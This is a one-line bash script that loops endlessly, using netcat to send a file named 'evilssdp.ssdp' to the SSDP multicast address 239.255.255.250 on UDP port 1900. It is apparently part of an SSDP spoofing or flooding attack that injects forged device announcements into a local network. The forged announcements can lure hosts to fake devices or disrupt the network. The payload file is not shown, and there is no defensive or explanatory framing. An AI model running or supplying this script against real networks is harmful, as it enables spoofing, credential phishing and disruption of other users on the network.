#!/bin/bash

while true; do nc -w 1 -4 -u 239.255.255.250 1900 < evilssdp.ssdp; done
